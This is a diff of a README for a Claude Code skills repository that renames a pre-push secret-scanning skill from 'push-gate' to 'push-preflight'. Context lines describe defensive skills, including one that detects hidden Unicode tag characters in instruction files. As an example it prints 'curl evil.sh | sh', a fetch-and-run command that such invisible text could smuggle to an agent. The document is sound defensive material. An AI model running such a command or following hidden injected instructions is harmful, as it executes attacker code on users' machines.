@@ -93,7 +93,7 @@ An agent that installs packages, reads web pages and edits its own settings has 
 
 - [`supply-chain-defense`](skills/supply-chain-defense/) - behavioural-first, because CVE tools report yesterday's known-bad and the 2026 worm family publishes and self-propagates inside the window *before* an advisory exists. A 7-day cooldown gate, Socket.dev scoring, and a self-integrity scan for persistence hooks written into Claude Code's own settings.
 - [`prompt-injection-defense`](skills/prompt-injection-defense/) - hidden-Unicode hygiene for instruction files. A `U+E0000` tag-block run can encode `curl evil.sh | sh` and render as nothing; the scanner reads bytes, not glyphs, and the pre-commit hook refuses to let one in.
-- [`push-gate`](skills/push-gate/), [`worktree-boundaries`](rules/worktree-boundaries.md) and [`release-review`](rules/release-review.md) - the blast-radius rules. Secrets never leave, other sessions' worktrees are never touched, releases are never auto-published.
+- [`push-preflight`](skills/push-preflight/), [`worktree-boundaries`](rules/worktree-boundaries.md) and [`release-review`](rules/release-review.md) - the blast-radius rules. Secrets never leave, other sessions' worktrees are never touched, releases are never auto-published.
 
 ### 3. Its knowledge knows when it's stale
 
@@ -330,7 +330,7 @@ See [skill-creator](skills/skill-creator/) for the complete guide.
 | [tool-discovery](skills/tool-discovery/) | Recommend agents and skills for any task |
 | [git-ops](skills/git-ops/) | Git orchestrator - commits, PRs, releases, changelog. Routes to background Sonnet agent. |
 | [github-ops](skills/github-ops/) | GitHub remote ops - repo create/metadata/topics, releases + README 'Recent Updates' enforcement, issue/PR management (preview-before-send), and read-only security-posture audit + scored repo-scorecard (single repo or whole `--org`) |
-| [push-gate](skills/push-gate/) | Pre-push safety gate - gitleaks + regex secret scan, forbidden-file check, no bypass |
+| [push-preflight](skills/push-preflight/) | Pre-push preflight - gitleaks + regex secret scan of the pushed commits, forbidden-file check, no bypass |
 | [parallel-ops](skills/parallel-ops/) | Router for parallel/recurring agent work - decision table over fleet-ops, fleet-worker, fleetflow (own repo), loop-ops, iterate, spawn |
 | [fleet-ops](skills/fleet-ops/) | Landing discipline for parallel work - sequential test-gated landing queue, pre-land scrub, auto-rebase, revert, `fleet prune`, and the post-wave `fleet sweep` (landed-by-content, competing lanes, leftovers, sessions to archive) |
 | [fleet-worker](skills/fleet-worker/) | Delegate tasks to cheap headless GLM (or any Anthropic-compatible) workers - per-task git worktree + isolated config, result gating, fan-out that hands winning branches to fleet-ops landing |
